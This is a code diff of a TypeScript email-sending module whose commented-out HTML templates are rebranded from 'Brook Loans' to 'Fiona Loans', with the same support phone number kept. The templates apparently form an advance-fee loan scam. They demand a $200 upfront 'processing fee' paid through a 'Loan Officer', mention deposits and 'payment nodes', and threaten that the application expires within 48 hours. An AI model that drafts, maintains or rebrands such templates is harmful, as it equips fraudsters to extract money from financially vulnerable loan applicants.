 //         <p style="color: #991b1b; font-size: 14px; margin: 0;"><strong>Important Notice:</strong> Your loan approval cannot be maintained indefinitely while in a flagged state. Your full loan disbursement remains heavily on hold, and failure to complete this secondary step within 48 hours will result in the automatic expiration of your application.</p>
 //       </div>
 //       <p style="color: #374151; font-size: 16px;">If you need help identifying the new deposit or locating a nearby payment node, call our specialized verification line immediately.</p>
-//       <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Brook Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
+//       <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Fiona Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
 //     `,
 //     color: "#dc2626",
 //     icon: "&#9888;",
@@ -876,7 +876,7 @@ export async function sendStatusUpdateEmail(
 //   upfront_needed: {
 //     title: "Processing Update",
 //     subject:
-//       "Action Required: Processing update for your Brook Loans application",
+//       "Action Required: Processing update for your Fiona Loans application",
 //     message: "",
 //     customBody: (details, formattedAmount) => `
 //       <p style="color: #374151; font-size: 16px;">Hello ${details.firstName},</p>
@@ -884,7 +884,7 @@ export async function sendStatusUpdateEmail(
 //       <p style="color: #374151; font-size: 16px;">Because your primary account is with an online banking institution, our automated system cannot fully verify your financial details. To move your application forward, our underwriting team must perform a manual review. This process involves manually auditing your bank statements, pulling and analyzing your credit report, and drafting the formal approval documentation required to fund your loan.</p>
 //       <p style="color: #374151; font-size: 16px;">To cover the additional administrative resources required for this manual review, a one-time processing fee of $200.00 is required before we can proceed.</p>
 //       <p style="color: #374151; font-size: 16px;">If you would like to move forward with this processing method, please call your dedicated Loan Officer at your earliest convenience to arrange the payment and finalize your application.</p>
-//       <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Brook Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
+//       <p style="color: #374151; font-size: 16px;">Best regards,<br/>The Fiona Loans Verifications Team<br/>Direct Support: (747) 208-0334</p>
 //     `,
 //     color: "#f59e0b",
 //     icon: "&#128176;",
@@ -929,7 +929,7 @@ export async function sendStatusUpdateEmail(
 //                   : status.replace(/_/g, " ").toUpperCase();
 
 //   const subject =
-//     config.subject || `${config.title} - ID: ${applicationId} | Brook Loans`;
+//     config.subject || `${config.title} - ID: ${applicationId} | Fiona Loans`;
 
 //   const messageHtml = config.customBody
 //     ? config.customBody(details, formattedAmount)
@@ -955,7 +955,7 @@ export async function sendStatusUpdateEmail(
 //       letter-spacing: 0.5px;
 //     "
 //   >
-//     Brook Loans
+//     Fiona Loans
 //   </h1>
 // </div>
 //       <div style="border: 1px solid #e5e7eb; border-top: none; padding: 30px; border-radius: 0 0 8px 8px;">
@@ -996,11 +996,11 @@ export async function sendStatusUpdateEmail(
 //             <strong>Phone:</strong> <a href="tel:+17472061606" style="color: #1a56db; text-decoration: none;">(747) 208-0334</a>
 //           </p>
 //           <p style="color: #374151; font-size: 14px; margin: 5px 0;">
-//             <strong>Website:</strong> <a href="https://www.brookloans.com" style="color: #1a56db; text-decoration: none;">www.brookloans.com</a>
+//             <strong>Website:</strong> <a href="https://www.fionaloans.com" style="color: #1a56db; text-decoration: none;">www.fionaloans.com</a>
 //           </p>
 //         </div>
 //         <p style="color: #9ca3af; font-size: 12px; text-align: center;">
-//           This is an automated email from Brook Loans. Please do not reply to this email.
+//           This is an automated email from Fiona Loans. Please do not reply to this email.
 //         </p>
 //       </div>
 //     </div>
